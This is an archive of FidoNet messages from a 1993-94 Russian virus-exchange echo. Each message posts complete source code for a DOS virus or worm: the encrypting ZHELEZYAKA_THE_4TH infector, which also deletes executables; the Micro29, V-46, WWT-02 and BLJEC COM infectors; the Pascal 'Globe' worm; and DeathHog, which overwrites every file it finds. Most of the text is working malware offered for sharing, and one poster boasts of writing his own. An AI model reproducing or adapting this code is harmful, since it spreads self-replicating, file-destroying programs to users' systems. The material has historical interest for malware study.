─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 22 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 08:59 
 To   : -  *.*  -                                                               
 Subj : ViRii                                                                   
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5c1a
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : ABC.PVT.HACK (ABC: Хацк...)
* From : Alexei Galich, 123:1000/6.2 (31 Oct 94 13:44)
* To   : All
* Subj : ViRii
═══════════════════════════════════════════════════════════════════════════════
Пpиветствyю Вас, All

Вот виpyс написал, стpашный, сам писал !
Hаезды пpинимаются с 1:00-8:00

PS: Hy не знаю я почемy он табyлюцию не понял, извините.

--------8<-------------------------------------------------------

;
;         ZHELEZYAKA_THE_4TH

  IDEAL
  MODEL TINY
  CODESEG
  ORG 100H
  LOCALS
MAIN_BEGIN: JMP VIRUS_START_O
  DB 04H,0,' ZHELEZYAKA_THE_4TH ',0

EXIT_ADDRESS EQU 100H
DOS  EQU 21H
VIRUS_SIGNATURE EQU 04H
NUM_FIRST_BYTES EQU 4
ALREADY_INFECT EQU 3
COUNTER_ADDR EQU 510H
FALSE_BYTE_ADDR EQU 104H
COM_WILDCARD EQU (COM_WILDCARD_O-VIRUS_START_O)
EXE_WILDCARD EQU (EXE_WILDCARD_O-VIRUS_START_O)

WRITE_BUFFER EQU (WRITE_BUFFER_O-VIRUS_START_O)
ORIGIN_DIR EQU (WRITE_BUFFER+NUM_FIRST_BYTES)
NEW_DTA  EQU (ORIGIN_DIR+65)
COPY_BUFFER EQU (NEW_DTA+256)
FALSE_BYTES EQU (COPY_BUFFER+WRITE_BUFFER)

ORIGIN_BEGIN EQU (ORIGIN_BEGIN_O-VIRUS_START_O)
MAIN_PART_LEN EQU (WRITE_BUFFER)
INFECTED_NUMB EQU (INFECTED_NUMB_O-VIRUS_START_O)
XOR_VALUE EQU (XOR_VALUE_O-VIRUS_START_O)
XOR_VAL0 EQU (XOR_VAL0_O-VIRUS_START_O)
XOR_VAL00 EQU (XOR_VAL00_O-VIRUS_START_O)
XOR_VAL1 EQU (XOR_VAL1_O-VIRUS_START_O)
XOR_VAL2 EQU (XOR_VAL2_O-VIRUS_START_O)
XOR_VAL3 EQU (XOR_VAL3_O-VIRUS_START_O)
XOR_VAL4 EQU (XOR_VAL4_O-VIRUS_START_O)
BEGIN_CODING EQU (BEGIN_CODING_O-VIRUS_START_O)
CONT_CODING EQU (CONT_CODING_O-VIRUS_START_O)
MESSAGE  EQU (MESSAGE_O-VIRUS_START_O)
DOT  EQU (DOT_O-VIRUS_START_O)

VIRUS_START_O: CALL DETECT_BEGIN_O
XOR_VAL0_O DB 0
DETECT_BEGIN_O: POP SI
  SUB SI,3 ; SI - ачало вируса
  JMP SHORT @@0
XOR_VAL00_O DB 0
@@0:  LEA DI,[SI+BEGIN_CODING]
  CALL CODE
BEGIN_CODING_O =$

  MOV CX,NUM_FIRST_BYTES ; Лечим
  LEA DI,[SI+ORIGIN_BEGIN] ; файл
  MOV BX,100H   ; в
MOVE_LOOP: MOV AH,[DI]   ; памяти
  MOV [BX],AH   ;
  INC DI   ;
  INC BX   ;
  LOOP MOVE_LOOP  ;

  LEA DX,[SI+NEW_DTA] ; Ставим
  MOV AH,1AH  ; свою
  CALL CHECK  ; DTA

  MOV AH,47H   ;
  PUSH SI   ; Запоминаем
  LEA SI,[SI+ORIGIN_DIR+1] ; текущий
  CWD    ; каталог
  CALL CHECK   ;
  POP SI   ;

FIND_FIRST: LEA DX,[SI+COM_WILDCARD] ; Поиск первого
  XOR CX,CX   ; COM файла
  MOV AH,4EH   ;
FIND_NEXT: INT DOS   ;
  JNC @@L1   ;
  JMP NO_FILES_FOUND  ; Если нет, то ...
@@L1:
  LEA DX,[SI+NEW_DTA+1EH] ; Откроем
  MOV AX,3D02H  ; этот
  CALL CHECK   ; файл


  MOV BX,AX   ; Прочитаем
  MOV AH,3FH   ; первые 4
  LEA DX,[SI+ORIGIN_BEGIN] ; байта
  MOV DI,DX   ; из
  MOV CX,NUM_FIRST_BYTES ; этого
  INT DOS   ; файла
  ADD DI,NUM_FIRST_BYTES-1

  CMP [BYTE PTR DI],VIRUS_SIGNATURE
  JE @@L2
  JMP INFECT_FILE
@@L2:
  MOV AH,3EH  ; Закроем
  CALL CHECK  ; файл

CONT_SEARCHING: MOV AH,4FH  ; айти
  JMP FIND_NEXT ; следующий файл

COM_WILDCARD_O DB '*.COM',0
EXE_WILDCARD_O DB '*.E*',0

MESSAGE_O DB 13,10,'ZHELEZYAKA_THE_4TH WITH YOU FOREVER',13,10,'$'
DOT_O  DB '..',0

NO_FILES_FOUND: MOV AH,3BH  ; Смещаемся
  LEA DX,[SI+DOT] ; на каталог
  INT DOS  ; вверх
  JC @@L4  ; пока
  JMP FIND_FIRST ; возможно
@@L4:
  XOR AX,AX   ;
  MOV ES,AX   ; Увеличиваем
  MOV DI,COUNTER_ADDR  ; счетчик
  MOV AX,[ES:DI]  ;

  INC AL   ;
  MOV [ES:DI],AX  ; Что
  CMP AL,ALREADY_INFECT ; будем
  JG INFECT_MORE  ; делать?
  CMP AH,ALREADY_INFECT-2 ;
  JG BANNER   ;
  JMP EXECUTE_PROG  ;

BANNER:  XOR AX,AX ; Сброс счетчика
  MOV [ES:DI],AX

  LEA DX,[SI+MESSAGE]  ; Вывод
  MOV AH,9   ; сообщения
  CALL CHECK   ;

  MOV CX,5 ;
CONTINUE_NOISE: MOV DL,7 ; Писк
  MOV AH,2 ;
  INT DOS ;
  LOOP CONTINUE_NOISE
  JMP EXECUTE_PROG

INFECT_MORE: XOR AL,AL  ; Стирание первого .E* файла
  INC AH
  MOV [ES:DI],AX

  LEA DI,[SI+ORIGIN_DIR] ;
  MOV [BYTE PTR DI],'\' ; Восстанавливаем
  MOV AH,3BH   ; старый
  XCHG DX,DI   ; каталог
  INT DOS   ;

  LEA DX,[SI+EXE_WILDCARD]
  XOR CX,CX
  MOV AH,4EH
  INT DOS
  JC EXECUTE_PROG

  LEA DX,[SI+NEW_DTA+1EH]
  MOV AH,41H
  INT 21H

EXECUTE_PROG: MOV DX,80H ; Ставим
  MOV AH,1AH ; старую
  INT DOS ; DTA

  LEA DI,[SI+ORIGIN_DIR] ;
  MOV [BYTE PTR DI],'\' ; Восстанавливаем
  MOV AH,3BH   ; старый
  XCHG DX,DI   ; каталог
  INT DOS   ;

  MOV AX,DS
  MOV ES,AX
  MOV BP,100H   ;
  JMP BP   ;

INFECT_FILE:
  XOR AL,AL    ;
  MOV AH,[BYTE PTR SI+XOR_VALUE] ;
@@IFZERO: INC AH    ;
  JZ @@IFZERO   ; Подготавливаем
  MOV [BYTE PTR SI+XOR_VALUE],AH ; новый
  MOV [SI+XOR_VAL0],AH  ; код
  MOV [SI+XOR_VAL00],AH  ;
  MOV [SI+XOR_VAL1],AH  ;
  MOV [SI+XOR_VAL2],AH  ;
  MOV [SI+XOR_VAL3],AH  ;
  MOV [SI+XOR_VAL4],AH  ;

  MOV AX,5700H ; Запоминаем
  CALL CHECK  ; время
  PUSH CX  ; создания
  PUSH DX  ;

  XOR CX,CX  ; Идем
  XOR DX,DX  ; на
  MOV AX,4202H ; конец
  CALL CHECK  ; файла

  SUB AX,3    ; Подготавливаем
  MOV [BYTE PTR SI+WRITE_BUFFER],0E9H ; новые
  MOV [SI+WRITE_BUFFER+1],AX  ; 4 байта
  MOV [BYTE PTR SI+WRITE_BUFFER+3],VIRUS_SIGNATURE

  MOV CX,MAIN_PART_LEN     ;
  MOV DI,SI       ; Копируем
COPY_LOOP: MOV AH,[DI]       ; вирус
  MOV [DI+COPY_BUFFER],AH     ; в
  INC DI       ; буффер
  LOOP COPY_LOOP      ;

  LEA DI,[SI+COPY_BUFFER+BEGIN_CODING]   ; Кодируем
  CALL CODER_DECODER      ; его

  LEA DI,[SI+COPY_BUFFER+CONT_CODING]
  CALL FIRST_CODE

  MOV CX,MAIN_PART_LEN  ; Подбираем
  MOV AL,[BYTE PTR FALSE_BYTE_ADDR] ; длину
  ADD AL,[FALSE_BYTES]  ;
  XOR AH,AH    ;
  ADD CX,AX    ; Пишем
  LEA DX,[SI+COPY_BUFFER]  ; главную
  MOV AH,40H    ; часть
  INT DOS    ; вируса


  XOR CX,CX  ; Идем
  XOR DX,DX  ; на
  MOV AX,4200H ; начало
  CALL CHECK  ; файла

  MOV CX,NUM_FIRST_BYTES ; Исправляем
  LEA DX,[SI+WRITE_BUFFER] ; первые
  MOV AH,40H   ; байты
  INT DOS   ; файла

  POP DX  ; Восстанавливаем
  POP CX  ; время
  MOV AX,5701H ; создания
  CALL CHECK  ;

  MOV AH,3EH  ; Закрываем
  INT DOS  ; файл

  CALL CODE_INT

  JMP EXECUTE_PROG

ORIGIN_BEGIN_O DB 0CDH,20H,90H,90H

CONT_CODING_O =$

CODER_DECODER: MOV CX,CODER_DECODER-BEGIN_CODING_O-1
  MOV AH,[SI+XOR_VALUE]
  XOR AL,AL
  OUT 21H,AL
CODING_LOOP: IN AL,21H
  ADD AL,AH
  XOR [DI],AL   ; Сам
  INC DI   ; кодировщик
  ADD AL,[FALSE_BYTE_ADDR]
  OUT 21H,AL   ;
  LOOP CODING_LOOP  ;
  XOR AL,AL
  OUT 21H,AL
  RET

CHECK:  PUSH AX ; Блокировка прерывания
  PUSHF
  MOV AL,0FEH
  OUT 21H,AL
  MOV AH,4FH
  POPF
  POP AX
  INT 21H
  PUSH AX
  PUSHF
  IN AL,21H
  CMP AL,0FEH
@@HALT:  JNE @@HALT
  XOR AL,AL
  OUT 21H,AL
  POPF
  POP AX
  RET

CODE_INT: XOR AX,AX ; Кодирование INT 0 - 3
  MOV ES,AX
  MOV CX,12
COD_INT_CON: MOV BX,CX
  XOR [BYTE PTR ES:BX],10101010B
  LOOP COD_INT_CON
  PUSH CS
  POP ES
  RET
       ; ------------
FIRST_CODE: MOV CX,FIRST_CODE-CODER_DECODER ; Предварительный
  MOV AH,[SI+XOR_VALUE]  ; кодировщик
  JMP SHORT FIRST_COD_LOOP
XOR_VAL1_O DB 0
FIRST_COD_LOOP: XOR [DI],AH
  INC DI
  JMP SHORT @@2
XOR_VAL2_O DB 0
@@2:  LOOP FIRST_COD_LOOP
  RET

XOR_VALUE_O DB 0

CODE:  PUSH DI
  LEA DI,[SI+CONT_CODING]
  JMP @@3
XOR_VAL3_O DB 0
@@3:  CALL FIRST_CODE
  MOV AH,40H
  JMP @@4
XOR_VAL4_O DB 0
@@4:  CALL CHECK  ; Чтобы обмануть перехватчик
  CALL CODE_INT
  POP DI
  JMP SHORT CODER_DECODER

WRITE_BUFFER_O =$
  END MAIN_BEGIN

---------------8<-------------------------------------------------

- Все это было бы пpикольно, когда бы не было так больно.

  -= iR0NMAN =-

-+- GoldED 2.50.B1016+
 + Origin: МЕHТОВКА - ЭТО ПРАЗДHИК !!! (123:1000/6.2)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/p            Check for code segment overrides in protected mode

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 23 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:08 
 To   : -  *.*  -                                                               
 Subj : MICRO29.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e21
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:01)
* To   : Clif Jessop
* Subj : MICRO29.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
; #############################################################################
; ###                                                                       ###
; ###                             M i C R O   29                            ###
; ###                                                                       ###
; ###                                  By                                   ###
; ###                                                                       ###
; ###                      Dreamer / Demoralized Youth                      ###
; ###                                                                       ###
; #############################################################################

        MOV     AH,4Eh                  ;Dos Universal:  FIND FIRST
        MOV     DX,OFFSET PATT
        INT     21h
        MOV     AX,3D02h                ;Dos Universal:  OPEN HANDLE
        MOV     DX,9Eh
        INT     21h
        XCHG    AX,BX
        MOV     AH,40h                  ;Dos Universal:  WRITE TO HANDLE
        ADD     DX,62h
        INT     21h
        RET

PATT    DB      '*.C*',0

-+-  GEcho 1.00
 + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/uxxxx        Set version emulation, version xxxx

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 24 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:08 
 To   : -  *.*  -                                                               
 Subj : TRV_46.ASM                                                              
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e32
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Doug Bryce, 2:283/718 (06 Nov 94 16:02)
* To   : Graham Allen
* Subj : TRV_46.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
;==================================================
; Virus V-46 (distributed by FIDO!!) on July 1991
;
; disassembled by Andrzej Kadlof July 24, 1991
;
; (C) Polish Section of Virus Information Bank
;==================================================

; virus entry point


0100 B44E           mov    ah,4E        ; Find First
0102 B120           mov    cl,20        ; archive
0104 BA2801         mov    dx,0128      ; asciiz file name '*.COM', 0
0107 CD21           int    21

0109 BA9E00         mov    dx,009E      ; buffer
010C B8013D         mov    ax,3D01      ; open file for write
010F CD21           int    21

0111 8BD8           mov    bx,ax        ; file handle
0113 BA0001         mov    dx,0100      ; virus address
0116 B12E           mov    cl,2E        ; file length
0118 B440           mov    ah,40        ; write file
011A CD21           int    21

011C B43E           mov    ah,3E        ; close file
011E CD21           int    21

0120 B44F           mov    ah,4F        ; find next
0122 CD21           int    21

0124 73E3           jnb    0109         ; infect

0126 CD20           int    20           ; return to DOS

0128 2A 2E 43 4F 4D 00   ; '*.COM', 0

; That's all!

-+-  GEcho 1.00
 + Origin: Stop creating them! Virusses aren't great! (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/dSYM[=VAL]   Define symbol SYM = 0, or = value VAL

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 25 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:09 
 To   : -  *.*  -                                                               
 Subj : WWT_02.ASM                                                              
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e42
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Graham Allen, 2:283/718 (06 Nov 94 16:06)
* To   : Bill Dirks
* Subj : WWT_02.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
; Virus name        WWT-02
; Description       Attack any COM file in current directory
; Comment       Don't change Date/Time, ignore ReadOnly
; Date          19 Dec 1990    15:30
; Place         CICTT
;
        mov dx,offset FileMask  ; FileMask for any COM file
        mov ah,4eh          ; Find first file
        mov cx,1            ; including attrib Archive
        int 21h         ; Call DOS
        jnc Ok          ; If no error -> go on
        jmp short Exit      ; If error -> exit program

Ok
        call    Infect          ; Do infection

DoNext
        mov dx,80h          ; Set DS:DX to DTA
        mov ah,4fh          ; Find Next file
        int 21h         ; Call DOS
        jnc NextOk          ; If no error -> go on
        jmp short Exit      ; If error -> exit
NextOk
        jmp short Ok        ; Still next file exist

Exit
        int 20h         ; Exit to DOS

Infect
        mov dx,9eh          ; Set DS:DX to filename in DTA
        mov ax,4300h        ; Get file attribute
        int 21h         ; Call DOS
        mov Attrib,cx       ; Save attribute for later
        xor cx,cx           ; New attribute -> normal file
        mov ax,4301h        ; Set attribute
        int 21h         ; Call DOS
        mov ax,3d02h        ; Open file for Read/Write
        int 21h         ; Call DOS
        jc  Exit            ; If error -> exit
        mov bx,ax           ; Save handle
        mov ax,5700h        ; Get file Date/Time
        int 21h         ; Call DOS
        mov Date,dx         ; Save date
        mov Time,cx         ; Save time
        mov dx,100h         ; DS:DX point to itself
        mov ah,40h          ; Write to handle
        mov cx,offset VirusSize-100h    ; Write only virus
        int 21h         ; Call DOS
        mov ax,5701h        ; Restore Date/Time
        mov cx,Time         ; Old time
        mov dx,Date         ; Old time
        int 21h         ; Call DOS
        mov ah,3eh          ; Close file
        int 21h         ; Call DOS
        mov dx,9eh          ; Set DS:DX to filename in DTA
        mov cx,Attrib       ; Restore attribute
        mov ax,4301h        ; Set file attribute
        int 21h         ; Call DOS
        ret             ; Return to caller


FileMask
        db  '*.COM',0               ; File mask for any COM file
Date
        dw  ?
Time
        dw  ?
Attrib
        dw  ?
VirusSize
        db  ?           ; Used to calculate virus
                        ; size

-+-  FidoPCB v1.4 [NR]
 + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/3            Enable 32-bit processing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 26 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:09 
 To   : -  *.*  -                                                               
 Subj : BLJEC_3A.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e59
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Brad Frazee, 2:283/718 (06 Nov 94 16:07)
* To   : Edwin Cleton
* Subj : BLJEC_3A.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Brad.Frazee@f718.n283.z2.fidonet.org
.model  tiny
.code
org     100h
kkk:
    nop ; ID
    nop ; ID

    mov cx,80h
    mov si,0080h
    mov di,0ff7fh
    rep movsb       ; save param

    lea ax,begp     ; begin prog
    mov cx,ax
        sub     ax,100h
        mov     ds:[0fah],ax   ; len VIR
    add cx,fso
        mov     ds:[0f8h],cx   ; begin buffer W
        ADD     CX,AX
        mov     ds:[0f6h],cx   ; begin buffer R

        mov     cx,ax
    lea si,kkk
        mov     di,ds:[0f8h]
RB:     REP     MOVSB           ; move v

        stc

        LEA     DX,FFF
        MOV     AH,4EH
        MOV     CX,20H
        INT     21H     ;  find first

    or  ax,ax
    jz  LLL
    jmp done

LLL:
    MOV     AH,2FH
        INT     21H     ; get DTA

    mov ax,es:[bx+1ah]
        mov     ds:[0fch],ax   ; size
    add bx,1eh
        mov     ds:[0feh],bx   ; point to name

    clc
    mov ax,3d02h
    mov dx,bx
    int 21h     ; open file

    mov bx,ax
    mov ah,3fh
        mov     cx,ds:[0fch]
        mov     dx,ds:[0f6h]
    int 21h     ; read file

    mov bx,dx
    mov ax,[bx]
    sub ax,9090h
    jz  fin


        MOV     AX,ds:[0fch]
        mov     bx,ds:[0f6h]
        mov     [bx-2],ax      ; correct old len

    mov ah,3ch
    mov cx,00h
        mov     dx,ds:[0feh]   ; point to name
    clc
    int 21h     ; create file

    mov bx,ax       ; #
    mov ah,40h
        mov     cx,ds:[0fch]
        add     cx,ds:[0fah]
        mov     DX,ds:[0f8h]
    int 21h     ; write file


    mov ah,3eh
    int 21h     ;close file

FIN:
    stc
    mov ah,4fh
    int 21h     ; find next

    or  ax,ax
    jnz done

        JMP     lll

DONE:

    mov cx,80h
    mov si,0ff7fh
    mov di,0080h
    rep movsb       ; restore param

        MOV     AX,0A4F3H
        mov     ds:[0fff9h],ax
    mov al,0eah
    mov ds:[0fffbh],al
    mov ax,100h
    mov ds:[0fffch],ax
    lea si,begp
    lea di,kkk
    mov ax,cs
    mov ds:[0fffeh],ax
    mov kk,ax
    mov cx,fso

    db  0eah
        dw      0fff9h
kk  dw  0000h

fff db  '*?.com',0
fso dw  0005h   ; ----- alma mater


begp:
    MOV     AX,4C00H
    int     21h     ; exit

end kkk

-+-  WM v2.09/91-0245
 + Origin: This virus is Microsoft Windows (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

Syntax: TLINK objfiles, exefile, mapfile, libfiles, deffile

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 27 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:09 
 To   : -  *.*  -                                                               
 Subj : GLOBE.C                                                                 
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e62
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Doug Bryce, 2:283/718 (06 Nov 94 16:07)
* To   : Viral Doctor
* Subj : GLOBE.C
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
Program Worm;

{$M 2048,0,4096}

Uses Dos, Crt;

Var      F1 : File;
         F2 : File;
         O : String;
         Parm : String;
         P : DirStr;
         N : NameStr;
         E : ExtStr;
         Buf : Array[0..8000] of Byte;
         NumRead : Word;
         NumWritten : Word;
         DirInfo : SearchRec;
         ComExist : SearchRec;
         Infect : Byte;

Procedure StartOrigExe;
Begin
     O := ParamStr(0);
     FSplit(O,P,N,E);
     O := P+N+'.EXE';
     P := '';
     For NumRead := 1 To ParamCount Do
         P := P + ParamStr(NumRead);
     SwapVectors;
     Exec(O,P);
     SwapVectors;
End;

Procedure InfectExe;
Begin
FindFirst('*.EXE',Archive,DirInfo);
While (DosError = 0) And (Infect <> 0) Do
   Begin
   FSplit(DirInfo.Name,P,N,E);
   O := P+N+'.COM';
   FindFirst(O,Hidden,ComExist);
   If DosError <> 0 Then
        Begin
        Assign(F1,O);
        Rewrite(F1,1);
        BlockWrite(F1,buf,NumRead,NumWritten);
        Close(F1);
        SetFattr(F1,Hidden);
        Dec(Infect);
        End;
   FindNext(DirInfo);
   End;
End;

Procedure Activate;
Var
  T1,T2 : Integer;
  I     : Real;
  X , Y : Byte;
  Resolution : Integer;

Begin
ClrScr;
I := 0;
T2 := 38;
Randomize;
Repeat
Resolution := 50;
For T1 := 0 to Resolution Do
    Begin
    X := Abs(40+Round(Sin(I)*T2));
    Y := Abs(12-Round(Cos(I)*10));
    GotoXY(X,Y);
    Write('█');
    I := I + ((Pi*2)/Resolution);
    End;
    T2 := T2 - 1;
    TextColor(Random(14)+1);
Until T2 < 2;
GotoXY(30,12);
TextColor(White);
Write('* The Globe Virus *');
 Asm
   Mov Ah,8
   Int 21h
 End;
ClrScr;
End;

Begin
  Infect := 3;
   Randomize;
   Assign(F2,ParamStr(0));
   Reset(F2,1);
   BlockRead(F2,buf,SizeOf(buf),NumRead);
   Close(F2);
     InfectExe;
     StartOrigExe;
     If Random(16) = 0 then Activate;
     Halt(DosExitCode);
End.

;  ─────────────────────────────────────────────────────────────────────────
;  ────────────────────> and Remember Don't Forget to Call <────────────────
;  ────────────> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <──────────
;  ─────────────────────────────────────────────────────────────────────────

-+-  GoldED 2.50.B1016+
 + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/v            Include full symbolic debug information

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 28 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:09 
 To   : -  *.*  -                                                               
 Subj : MINI_68.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5e6a
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mike Salvino, 2:283/718 (06 Nov 94 16:08)
* To   : Clif Jessop
* Subj : MINI_68.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mike.Salvino@f718.n283.z2.fidonet.org
; DeathHog, (will defeat read-only files and appends itself to all
; files)
; Originally based upon DeathCow (C) 1991 by Nowhere Man and [NuKE] WaErZ
; r/w access, nuisance routines supplied by KOUCH
;
; Appended by Kouch, derived from DeathCow/Define (author unknown)


virus_length    equ     finish - start

    code    segment 'CODE'
        assume cs:code,ds:code,es:code,ss:code

        org     0100h

start           label   near

main            proc    near
        mov     ah,04Eh                 ; DOS find first file function
        mov     dx,offset file_spec      ; DX points to "*.*" - any file
        int     021h

infect_file :   mov     ah,43H                 ;the beginning of this
        mov     al,0                   ;routine gets the file's
        mov     dx,09Eh                ;attribute and changes it
        int     21H                    ;to r/w access so that when
                           ;it comes time to open the
        mov     ah,43H                 ;file, the virus can easily
        mov     al,1                   ;defeat files with a 'read only'
        mov     dx,09Eh                ;attribute. It leaves the file r/w,
        mov     cl,0                   ;because who checks that, anyway?
        int     21H

        mov     ax,03D01h              ; DOS open file function, write-only
        mov     dx,09Eh                ; DX points to the found file
        int     021h

        xchg    bx,ax                  ; BX holds file handle

        mov     ah,040h                ; DOS write to file function
        mov     cl,virus_length        ; CL holds # of bytes to write
        mov     dx,offset main         ; DX points to start of code
        int     021h

        mov     ah,03Eh                ; DOS close file function
        int     021h

        mov     ah,04Fh                 ; DOS find next file function
        int     021h
        jnc     infect_file             ; Infect next file, if found

        mov     ah,31h                  ;insert 480K memory balloon
        mov     dx,7530h                ;for nuisance value
        int     21H                     ;it's big enough so 'out of
                        ;memory' messages will start cropping up quickly
                           ; RETurn to DOS

file_spec       db      "*.*",0               ; Files to infect:  apped to all
files
main            endp

finish          label   near

    code    ends
        end     main

-+-  UC2 Support France
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/Twx          Windows image

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 29 of 90                                                                
